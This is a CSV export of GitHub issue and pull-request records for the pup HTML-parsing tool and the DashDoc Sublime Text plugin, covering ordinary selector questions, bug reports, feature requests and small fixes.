",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/29/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/29/comments,https://api.github.com/repos/ericchiang/pup/issues/29/events,https://github.com/ericchiang/pup/issues/29,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/28,49837648,MDExOlB1bGxSZXF1ZXN0MjQ5MDU4OTI=,28,0.3.5,2342749,closed,FALSE,NA,NA,0,2014-11-23T20:21:51Z,2014-11-23T20:25:25Z,2014-11-23T20:21:55Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/28/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/28/comments,https://api.github.com/repos/ericchiang/pup/issues/28/events,https://github.com/ericchiang/pup/pull/28,https://api.github.com/repos/ericchiang/pup/pulls/28
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/27,49747941,MDU6SXNzdWU0OTc0Nzk0MQ==,27,Use several selectors?,1451276,closed,FALSE,NA,NA,12,2014-11-21T21:02:00Z,2020-03-21T01:42:06Z,2014-11-22T16:03:45Z,NONE,NA,"Hello, is it possible to use several selectors one after the other. For example from here:

http://voxeu.org/article/economics-secession

I can get separately h1, .article-teaser, article-content

with 

curl hIttp://voxeu.org/article/economics-secession | ./pup 'h1 text{}'

and so on, but I would like the text to appear one after the other. That is, the text from h1, then the text from .article-teaser, and then the text from .article-content. 
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/27/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/27/comments,https://api.github.com/repos/ericchiang/pup/issues/27/events,https://github.com/ericchiang/pup/issues/27,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/26,47449456,MDU6SXNzdWU0NzQ0OTQ1Ng==,26,:nth-child psudo selectors,1427632,closed,FALSE,NA,NA,4,2014-10-31T22:09:57Z,2014-11-10T19:34:46Z,2014-11-10T03:34:56Z,NONE,NA,"I'm trying to parse an HTML table with some interesting data on it, pup works great for one part of it

```
curl -s ""www.talkenglish.com/Vocabulary/Top-500-Adjectives.aspx"" | pup ""#GridView3 a text{}""
```

however, when trying to pull out how common they were, (the third TD element)

```
curl -s ""www.talkenglish.com/Vocabulary/Top-500-Adjectives.aspx"" | pup ""#GridView3 td:nth-child(3) text{}""
```

no workey :sob:

I think I can grab it using the align=""right"" attribute as a work around, however I think nth-child selectors should be a priority for you, because if you inspect a webpage with firefox and right click on an element, you can select ""Copy Unique Selector"", which will give you this in your clipboard `#GridView3 > tbody:nth-child(1) > tr:nth-child(1) > td:nth-child(3)`, which is a very handy piece of pup can work with.
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/26/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/26/comments,https://api.github.com/repos/ericchiang/pup/issues/26/events,https://github.com/ericchiang/pup/issues/26,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/25,46461036,MDU6SXNzdWU0NjQ2MTAzNg==,25,Attribute value condition escaping,2882,closed,FALSE,NA,NA,2,2014-10-22T00:32:48Z,2014-11-10T03:38:43Z,2014-11-10T03:38:43Z,NONE,NA,"The following gives me an errror:

```
$ curl -sL URL | pup 'a[href^=product.php?sku=] attr{href}'
```

I tried enclosing `product.php?sku=` in single and double quotes, but it doesn't work.

The error I get is:

```
Selector parse error: more than one '='
```
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/25/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/25/comments,https://api.github.com/repos/ericchiang/pup/issues/25/events,https://github.com/ericchiang/pup/issues/25,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/24,45616272,MDU6SXNzdWU0NTYxNjI3Mg==,24,Accesible via homebrew?,139499,closed,FALSE,NA,NA,2,2014-10-13T07:43:11Z,2014-10-15T05:58:32Z,2014-10-13T15:40:15Z,NONE,NA,"This is such a neat program! I usually opt for writing python/node.js scripts; but pup is perfect for simple bash scripts.

It'd be neat if `pup` is installable via homebrew: http://brew.sh/ for osx. 

i.e. `brew install pup`

afaik, the name is not taken: http://braumeister.org/search/pup

---

Just a suggestion. Getting dist releases via github is not really a big deal.
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/24/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/24/comments,https://api.github.com/repos/ericchiang/pup/issues/24/events,https://github.com/ericchiang/pup/issues/24,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/23,45556801,MDExOlB1bGxSZXF1ZXN0MjI2MDYwMDE=,23,json{} displayer added,2342749,closed,FALSE,NA,NA,0,2014-10-11T17:11:38Z,2014-10-11T17:37:42Z,2014-10-11T17:11:44Z,OWNER,NA,"aw yeah
",NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/23/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/23/comments,https://api.github.com/repos/ericchiang/pup/issues/23/events,https://github.com/ericchiang/pup/pull/23,https://api.github.com/repos/ericchiang/pup/pulls/23
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/22,44575465,MDU6SXNzdWU0NDU3NTQ2NQ==,22,streaming implementation request,888911,closed,FALSE,NA,NA,3,2014-10-01T15:16:23Z,2014-10-11T13:15:41Z,2014-10-10T02:40:29Z,NONE,NA,"when feed html to pup using pipe with infinite streaming content, pup do not output anything but just eat up memory. This behavior restricts pup's use in shell pipe when large input is encountered
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/22/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/22/comments,https://api.github.com/repos/ericchiang/pup/issues/22/events,https://github.com/ericchiang/pup/issues/22,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/21,44245630,MDU6SXNzdWU0NDI0NTYzMA==,21,Change documentation to point to something other than w3schools,5769156,closed,FALSE,NA,NA,1,2014-09-28T23:41:53Z,2014-09-29T00:03:10Z,2014-09-29T00:03:10Z,CONTRIBUTOR,NA,"Please checkout http://www.w3fools.com/.  It highlights several things wrong with the site you point to in your README file.  May I suggest pointing to https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Getting_started/Selectors
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/21/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/21/comments,https://api.github.com/repos/ericchiang/pup/issues/21/events,https://github.com/ericchiang/pup/issues/21,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/20,43774981,MDExOlB1bGxSZXF1ZXN0MjE3MTk4OTk=,20,Replace w3schools with a better reference,166692,closed,FALSE,NA,NA,5,2014-09-24T15:00:12Z,2014-09-29T01:17:58Z,2014-09-29T01:06:31Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/20/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/20/comments,https://api.github.com/repos/ericchiang/pup/issues/20/events,https://github.com/ericchiang/pup/pull/20,https://api.github.com/repos/ericchiang/pup/pulls/20
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/19,43658011,MDU6SXNzdWU0MzY1ODAxMQ==,19,Special characters are not encoded in output,195070,closed,FALSE,NA,NA,4,2014-09-23T17:23:01Z,2014-12-26T23:27:53Z,2014-09-28T16:28:34Z,NONE,NA,"HTML entities are decoded on input, but special characters are not encoded in the output. 

```
$ echo '<div data-foo=""&quot;"">&amp;</div>' | pup div
<div data-foo="""""">
 &
</div>
```
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/19/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/19/comments,https://api.github.com/repos/ericchiang/pup/issues/19/events,https://github.com/ericchiang/pup/issues/19,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/18,43653982,MDExOlB1bGxSZXF1ZXN0MjE2NTk0NDk=,18,[WIP] Support json template,2840571,closed,FALSE,NA,NA,2,2014-09-23T16:48:30Z,2014-09-24T01:49:09Z,2014-09-24T01:49:09Z,NONE,NA,"This is for #2, and is still under development. I open this PR because I want to start discussion.
I move the ""traveling"" into `ApplySelectors` function so we can reuse it. In other words, we now can simply use this function to parse several groups of selectors.
However, there is one concern: should we implement `json` as a display function? In my opinion, it is not so similar to a display function. Maybe we should add something like _nested function_?
Also, I think we might need to change the behavior of display function a little bit. For example, we would eventually want the `ApplySelectors` to return a list, and then leave other function to _display_ the result. In this way, we can use the return results more flexibly.
How do you think?
",NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/18/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/18/comments,https://api.github.com/repos/ericchiang/pup/issues/18/events,https://github.com/ericchiang/pup/pull/18,https://api.github.com/repos/ericchiang/pup/pulls/18
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/17,43312635,MDU6SXNzdWU0MzMxMjYzNQ==,17,Slice function does not return the expected result ,8843653,closed,FALSE,NA,NA,3,2014-09-20T15:32:52Z,2014-09-20T22:57:48Z,2014-09-20T22:57:48Z,NONE,NA,"First of all, thanks for this great work! Pup is a awesome tool!

I'm using the arm linux version of pup in my Raspberry Pi. The slice function always return empty on my tests. Even with the examples on readme like: pup < robots.html a slice{0}

Thanks in advance
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/17/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/17/comments,https://api.github.com/repos/ericchiang/pup/issues/17/events,https://github.com/ericchiang/pup/issues/17,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/16,43230222,MDU6SXNzdWU0MzIzMDIyMg==,16,':parent-of' & ':contains' pseudo-selectors,1037931,closed,FALSE,NA,NA,4,2014-09-19T11:54:50Z,2014-11-10T14:33:03Z,2014-11-10T14:22:30Z,NONE,NA,"Hi,

I suggest adding a `:parent-of(selector)` (non-standard) and `:contains(""text"")` (standard) to the selector list.

It would be very useful to select the right elements when they don't have any specific class.
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/16/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/16/comments,https://api.github.com/repos/ericchiang/pup/issues/16/events,https://github.com/ericchiang/pup/issues/16,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/15,43200073,MDU6SXNzdWU0MzIwMDA3Mw==,15,Enable Sourcegraph,1976,closed,FALSE,NA,NA,2,2014-09-19T03:04:54Z,2014-09-19T04:42:46Z,2014-09-19T04:42:46Z,NONE,NA,"I want to use [Sourcegraph code search and code review](https://sourcegraph.com) with pup. A project maintainer needs to enable it to set up a webhook so the code is up-to-date there.

Could you please enable pup on @Sourcegraph by going to https://sourcegraph.com/github.com/EricChiang/pup and clicking on Settings? (It should only take 15 seconds.)

Thank you!
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/15/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/15/comments,https://api.github.com/repos/ericchiang/pup/issues/15/events,https://github.com/ericchiang/pup/issues/15,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/14,43184846,MDU6SXNzdWU0MzE4NDg0Ng==,14,Matching classes,10137,closed,FALSE,NA,NA,2,2014-09-18T22:18:01Z,2014-09-18T23:01:22Z,2014-09-18T23:01:22Z,NONE,NA,"With this HTML file:

``` html
<div class=""a b c"">
  Hello
</div>
```

If I wanted to match that `<div>`, I have to do:

```
cat file.html | pup 'div.a b c'
```

Yeah, spaces included. Doing `div.a` or `div.b` or `div.c` or `div.a.b.c` doesn't work D:
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/14/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/14/comments,https://api.github.com/repos/ericchiang/pup/issues/14/events,https://github.com/ericchiang/pup/issues/14,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/13,43052276,MDU6SXNzdWU0MzA1MjI3Ng==,13,Not selector?,30924,closed,FALSE,NA,NA,3,2014-09-17T19:23:46Z,2014-11-10T14:24:33Z,2014-11-10T14:24:33Z,NONE,NA,"Is it possible to select all the nodes _except_ something matching a particular selector?

For instance, I’d like to turn:

```
<span>something <br style=""page-break-before:auto"" clear=""all""></span>
```

Into:

```
<span>something</span>
```

By selecting doing something like (just randomly inventing this syntax):

```
cat myfile.html | pup *:not:br[style=""page-break-before:auto""]
```

(Thanks for pup, it’s awesome.)
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/13/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/13/comments,https://api.github.com/repos/ericchiang/pup/issues/13/events,https://github.com/ericchiang/pup/issues/13,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/12,43028289,MDU6SXNzdWU0MzAyODI4OQ==,12,REPL mode,508865,closed,FALSE,NA,NA,1,2014-09-17T15:47:05Z,2014-09-17T16:22:22Z,2014-09-17T16:22:22Z,NONE,NA,"I think it would be very useful to have a REPL mode in pup, for exploring the output of different selectors, or for drilling down through the content by applying one selector, and then applying another selector to the output of the first, etc.

I don't have any personal experience with REPL libraries, but as a starting point, [this one](https://github.com/tadmarshall/linenoise) looks good and was used [by PhantomJS](http://phantomjs.org/repl.html).  It looks like there is a golang wrapper [here](https://github.com/GeertJohan/go.linenoise)
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/12/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/12/comments,https://api.github.com/repos/ericchiang/pup/issues/12/events,https://github.com/ericchiang/pup/issues/12,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/11,42907330,MDExOlB1bGxSZXF1ZXN0MjEzMTMzNzA=,11,Use charset.NewReader(),10111,closed,FALSE,NA,NA,1,2014-09-16T17:13:13Z,2014-09-16T18:21:53Z,2014-09-16T18:18:49Z,CONTRIBUTOR,NA,"In CJK, there are still non-utf-8 pages. So use charset.NewReader to parse.
",NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/11/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/11/comments,https://api.github.com/repos/ericchiang/pup/issues/11/events,https://github.com/ericchiang/pup/pull/11,https://api.github.com/repos/ericchiang/pup/pulls/11
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/10,42837497,MDExOlB1bGxSZXF1ZXN0MjEyNzI1Mjk=,10,Update README.md. Use curl -s to be quiet,10111,closed,FALSE,NA,NA,2,2014-09-16T01:56:42Z,2014-09-16T01:59:44Z,2014-09-16T01:59:13Z,CONTRIBUTOR,NA,"cosmetic change.
",NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/10/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/10/comments,https://api.github.com/repos/ericchiang/pup/issues/10/events,https://github.com/ericchiang/pup/pull/10,https://api.github.com/repos/ericchiang/pup/pulls/10
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/9,42835803,MDExOlB1bGxSZXF1ZXN0MjEyNzE0ODU=,9,Support windows,10111,closed,FALSE,NA,NA,5,2014-09-16T01:18:10Z,2015-05-26T17:26:09Z,2014-09-16T01:48:15Z,CONTRIBUTOR,NA,"It's too short changes. But it support windows. :)
",NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/9/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/9/comments,https://api.github.com/repos/ericchiang/pup/issues/9/events,https://github.com/ericchiang/pup/pull/9,https://api.github.com/repos/ericchiang/pup/pulls/9
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/8,42743714,MDU6SXNzdWU0Mjc0MzcxNA==,8,Result in UTF-8,1442383,closed,FALSE,NA,NA,12,2014-09-15T06:03:21Z,2015-06-10T07:32:54Z,2014-12-14T05:05:06Z,NONE,NA,"Hi,

Is there any setting to set result in UTF-8?
I execute this command:
curl http://wiki.seg.org/wiki/Dictionary:Deconvolution | pup div#mw-content-text
it gives me some weird characters.
i.e.
(de kon v&#x14d;&#x2019; l&#x16b; sh&#x2202;n) is translated as       â lÅ« shân)<b> kon vÅ
(1995, 285 and 292&#x2013;303) is translated as (1995, 285 and 292â303)

Thanks
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/8/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/8/comments,https://api.github.com/repos/ericchiang/pup/issues/8/events,https://github.com/ericchiang/pup/issues/8,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/7,42737329,MDExOlB1bGxSZXF1ZXN0MjEyMTE2MjI=,7,Dev,2342749,closed,FALSE,NA,NA,0,2014-09-15T02:21:32Z,2014-09-15T02:22:44Z,2014-09-15T02:21:38Z,OWNER,NA,"Tests added and some small changes to the internals for more modular development.
",NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/7/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/7/comments,https://api.github.com/repos/ericchiang/pup/issues/7/events,https://github.com/ericchiang/pup/pull/7,https://api.github.com/repos/ericchiang/pup/pulls/7
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/6,42736328,MDU6SXNzdWU0MjczNjMyOA==,6,attr{attrkey} is not working,1442383,closed,FALSE,NA,NA,7,2014-09-15T01:42:21Z,2014-09-15T03:02:55Z,2014-09-15T03:02:55Z,NONE,NA,"I try your example.
curl http://www.pro-football-reference.com/years/2013/games.htm | pup table#games 'a[href_=boxscores]'
It gives me a result.
However, if I use curl http://www.pro-football-reference.com/years/2013/games.htm | pup table#games 'a[href_=boxscores]' attr{href}, it returns empty.

I use https://github.com/EricChiang/pup/releases/download/0.1.1/pup_linux_386 to execute it.

Thanks
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/6/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/6/comments,https://api.github.com/repos/ericchiang/pup/issues/6/events,https://github.com/ericchiang/pup/issues/6,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/5,42726269,MDU6SXNzdWU0MjcyNjI2OQ==,5,Move compiled binaries to a different repo,10137,closed,FALSE,NA,NA,5,2014-09-14T17:58:57Z,2014-09-14T20:43:08Z,2014-09-14T20:17:29Z,NONE,NA,"Please.

They increment the size of this repo, and some people (me, at least) just want to get the code.

If I run `go get` the whole repo will be fetched, including the bins and all their committed versions.
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/5/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/5/comments,https://api.github.com/repos/ericchiang/pup/issues/5/events,https://github.com/ericchiang/pup/issues/5,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/4,42722409,MDU6SXNzdWU0MjcyMjQwOQ==,4,exact match class selector,1320353,closed,FALSE,NA,NA,3,2014-09-14T15:03:11Z,2014-09-18T22:43:35Z,2014-09-14T23:03:01Z,NONE,NA,"I am having an ""issue"" it seems pup only likes exact matches on element class?

example.html

``` html
<div class=""nav clearfix"">
  <!-- Other elements Here -->
</div>
```

```
$ pup < example.html .nav                                                                                 
$ pup < example.html "".nav clearfix""                                                                               
<div class=""nav clearfix"">
</div>
```
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/4/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/4/comments,https://api.github.com/repos/ericchiang/pup/issues/4/events,https://github.com/ericchiang/pup/issues/4,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/3,42716493,MDExOlB1bGxSZXF1ZXN0MjEyMDIxMjU=,3,Quote possible shell wildcard,525838,closed,FALSE,NA,NA,1,2014-09-14T09:09:20Z,2014-09-14T14:17:41Z,2014-09-14T14:17:40Z,CONTRIBUTOR,NA,"Because of this:

```
$ echo a[href*=boxscores]
a[href*=boxscores]
$ touch ah
$ echo a[href*=boxscores]
ah
```
",NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/3/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/3/comments,https://api.github.com/repos/ericchiang/pup/issues/3/events,https://github.com/ericchiang/pup/pull/3,https://api.github.com/repos/ericchiang/pup/pulls/3
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/2,42709427,MDU6SXNzdWU0MjcwOTQyNw==,2,Templated Transformations,321596,closed,FALSE,NA,NA,3,2014-09-14T00:39:24Z,2014-10-11T17:19:42Z,2014-10-11T17:19:42Z,NONE,NA,"## Rationale

`pup` has **incredible** potential as a quick web scraping tool.

To extract and reformat information from an HTML stream, the user would have to:
- Download the HTML file
- Filter it with `pup` multiple times, saving output to one or more additional files
- Compile the extracted text in a structured format

To reach the next level of awesome, this entire workflow could be automated by `pup`.
## Proposal

I propose adding a new flag to `pup`: `-t | --template [file]`.

When the `-t` flag is present, `pup` ignores command-line selectors. Instead, it reads a file written in a simple templating language and renders the template replacing some special syntax with `pup` selector query results.

For example:

HTML

```
<html>
<head>
    <title>Some Page</title>
</head>
<body>
    <p>
        A link to <a href=""http://www.google.com"">Google</a>
    </p>
</body>
</html>
```

Template

```
{
    'title': '<# title text{} >',
    'link' : '<# body p a [href] >'
}
```

Pup output

```
{
    'title': 'Some Page',
    'link' : 'http://www.google.com'
}
```
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/2/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/2/comments,https://api.github.com/repos/ericchiang/pup/issues/2/events,https://github.com/ericchiang/pup/issues/2,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/1,42703501,MDExOlB1bGxSZXF1ZXN0MjExOTYzNDA=,1,Typo,7367,closed,FALSE,NA,NA,1,2014-09-13T19:25:10Z,2014-09-16T01:55:11Z,2014-09-13T19:28:02Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/1/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/1/comments,https://api.github.com/repos/ericchiang/pup/issues/1/events,https://github.com/ericchiang/pup/pull/1,https://api.github.com/repos/ericchiang/pup/pulls/1
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/70,583942107,MDU6SXNzdWU1ODM5NDIxMDc=,70,Dash v5 no longer takes you right to the result.,772937,open,FALSE,NA,NA,5,2020-03-18T19:04:30Z,2020-06-10T18:00:24Z,NA,CONTRIBUTOR,NA,"Maybe this is a question for @Kapeli instead, but with Dash v5, we no longer get an immediate result when invoking on a selected word.

v4:
<img width=""801"" alt=""Screen Shot 2020-03-18 at 12 03 00 PM"" src=""https://user-images.githubusercontent.com/772937/76997481-95b0b300-6910-11ea-9d6b-baec33e026ac.png"">

---

v5:
<img width=""1028"" alt=""Screen Shot 2020-03-18 at 12 03 29 PM"" src=""https://user-images.githubusercontent.com/772937/76997496-9ba69400-6910-11ea-9321-efd0ac6b5a82.png"">",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/70/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/70/comments,https://api.github.com/repos/farcaller/DashDoc/issues/70/events,https://github.com/farcaller/DashDoc/issues/70,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/69,523931095,MDExOlB1bGxSZXF1ZXN0MzQxODE2ODcw,69,Update README.md,7011993,closed,FALSE,NA,NA,1,2019-11-17T03:51:25Z,2019-11-21T13:13:40Z,2019-11-21T13:13:33Z,CONTRIBUTOR,NA,Fixes #64 ,NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/69/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/69/comments,https://api.github.com/repos/farcaller/DashDoc/issues/69/events,https://github.com/farcaller/DashDoc/pull/69,https://api.github.com/repos/farcaller/DashDoc/pulls/69
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/68,496637953,MDExOlB1bGxSZXF1ZXN0MzE5OTQ3ODk3,68,Fixing a syntax error,6096301,closed,FALSE,NA,NA,2,2019-09-21T09:51:10Z,2019-09-22T19:41:32Z,2019-09-21T10:03:32Z,CONTRIBUTOR,NA,"Fixes the syntax error introduced by https://github.com/farcaller/DashDoc/pull/67

The error logs:
```
reloading plugin DashDoc.DashDoc
Traceback (most recent call last):
  File ""/Applications/Sublime Text.app/Contents/MacOS/sublime_plugin.py"", line 125, in reload_plugin
    m = importlib.import_module(modulename)
  File ""./python3.3/importlib/__init__.py"", line 90, in import_module
  File ""<frozen importlib._bootstrap>"", line 1584, in _gcd_import
  File ""<frozen importlib._bootstrap>"", line 1565, in _find_and_load
  File ""<frozen importlib._bootstrap>"", line 1532, in _find_and_load_unlocked
  File ""/Applications/Sublime Text.app/Contents/MacOS/sublime_plugin.py"", line 1199, in load_module
    exec(compile(source, source_path, 'exec'), mod.__dict__)
  File ""/Users/jacek/Library/Application Support/Sublime Text 3/Installed Packages/DashDoc.sublime-package/DashDoc.py"", line 28
    def open_dash(query, keys, run_in_background)
                                                ^
SyntaxError: invalid syntax
```",NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/68/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/68/comments,https://api.github.com/repos/farcaller/DashDoc/issues/68/events,https://github.com/farcaller/DashDoc/pull/68,https://api.github.com/repos/farcaller/DashDoc/pulls/68
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/67,495406741,MDExOlB1bGxSZXF1ZXN0MzE4OTYwNDUw,67,Factor out Dash opening code so that searching is cross platform.,772937,closed,FALSE,NA,NA,0,2019-09-18T19:14:03Z,2019-09-19T19:15:40Z,2019-09-19T19:15:40Z,CONTRIBUTOR,NA,I should have done this in the first place ... sorry.,NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/67/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/67/comments,https://api.github.com/repos/farcaller/DashDoc/issues/67/events,https://github.com/farcaller/DashDoc/pull/67,https://api.github.com/repos/farcaller/DashDoc/pulls/67
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/66,494802927,MDExOlB1bGxSZXF1ZXN0MzE4NDg1NjE1,66,"Add query param, so that searching actually works.",772937,closed,FALSE,NA,NA,3,2019-09-17T19:13:43Z,2019-09-17T19:35:19Z,2019-09-17T19:34:49Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/66/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/66/comments,https://api.github.com/repos/farcaller/DashDoc/issues/66/events,https://github.com/farcaller/DashDoc/pull/66,https://api.github.com/repos/farcaller/DashDoc/pulls/66
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/65,469855652,MDExOlB1bGxSZXF1ZXN0Mjk4OTg0Nzgw,65,Add support to search anything.,772937,closed,FALSE,NA,NA,4,2019-07-18T16:01:16Z,2019-09-15T07:50:49Z,2019-09-15T07:17:10Z,CONTRIBUTOR,NA,"Rebase of: https://github.com/farcaller/DashDoc/pull/19

@farcaller, does this look OK?",NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/65/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/65/comments,https://api.github.com/repos/farcaller/DashDoc/issues/65/events,https://github.com/farcaller/DashDoc/pull/65,https://api.github.com/repos/farcaller/DashDoc/pulls/65
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/64,454704392,MDU6SXNzdWU0NTQ3MDQzOTI=,64,Not working on Mac 10.14.5 ST3,6561770,closed,FALSE,NA,NA,1,2019-06-11T13:52:23Z,2019-11-21T13:13:33Z,2019-11-21T13:13:33Z,NONE,NA,"{ ""keys"": [""ctrl+h""], ""command"": ""dash_doc""},

With keys or with the menu doesn't work",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/64/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/64/comments,https://api.github.com/repos/farcaller/DashDoc/issues/64/events,https://github.com/farcaller/DashDoc/issues/64,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/63,360211212,MDU6SXNzdWUzNjAyMTEyMTI=,63,DashDoc can not work after installing both zeal and velocity and uninstall zeal,16662357,open,FALSE,NA,NA,0,2018-09-14T08:44:05Z,2019-11-21T13:14:23Z,NA,NONE,NA,"I first installed velocity and DashDoc for sublime text. The doc search works well and use velocity. I then installed zeal. The doc search works well and use zeal. I then decided to uninstall zeal. After that, DasDoc does not work any more. 

